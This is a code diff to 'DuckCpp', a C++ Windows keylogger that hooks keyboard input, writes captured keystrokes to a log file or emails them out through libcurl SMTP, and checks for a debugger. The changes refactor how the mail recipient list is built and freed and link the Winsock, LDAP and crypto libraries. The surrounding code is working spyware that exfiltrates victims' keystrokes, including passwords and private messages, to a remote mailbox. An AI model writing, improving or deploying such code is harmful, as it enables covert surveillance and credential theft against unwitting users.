@@ -1,5 +1,9 @@
 #define WIN32_LEAN_AND_MEAN
 
+#pragma comment(lib, "ws2_32.lib")  //WinSocks2
+#pragma comment(lib, "wldap32.lib")
+#pragma comment(lib, "Crypt32.lib")
+
 #include <string>
 #include <fstream>
 
@@ -38,7 +42,7 @@ string header = "To: " + repicient + "\r\n" +
 "From: " + login + " (DuckCpp log sender)\r\n" +
 "Subject: Log\r\n\r\n";
 workMode mode = trySendEmail ? sendLogEmail : writeLogFile;
-
+struct curl_slist* recipients = NULL;
 
 //Function prototypes
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
@@ -51,6 +55,9 @@ void checkDebugging();
 //Main
 int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 {
+	keyLog.reserve(256);
+	if(trySendEmail)
+		recipients = curl_slist_append(recipients, repicient.c_str());
 	checkDebugging();
 
 	//Create directory for log
@@ -95,7 +102,8 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	}
 
 	KillTimer(NULL, 1); //Destroy timer
-	processLog();
+	processLog(); //Last log processing
+	curl_slist_free_all(recipients);
 	CloseHandle(logFileHandle); //Close file handle
 	return 0;
 }
@@ -184,17 +192,12 @@ bool sendMail()
 		curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
 		curl_easy_setopt(curl, CURLOPT_URL, URL.c_str());
 		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, login.c_str());
-
-		struct curl_slist* recipients = NULL;
-		recipients = curl_slist_append(recipients, repicient.c_str());
 		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
-
 		curl_easy_setopt(curl, CURLOPT_READFUNCTION, readfunc);
 		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
 
 		CURLcode res = curl_easy_perform(curl);
 
-		curl_slist_free_all(recipients);
 		curl_easy_cleanup(curl);
 
 		return res == CURLE_OK;
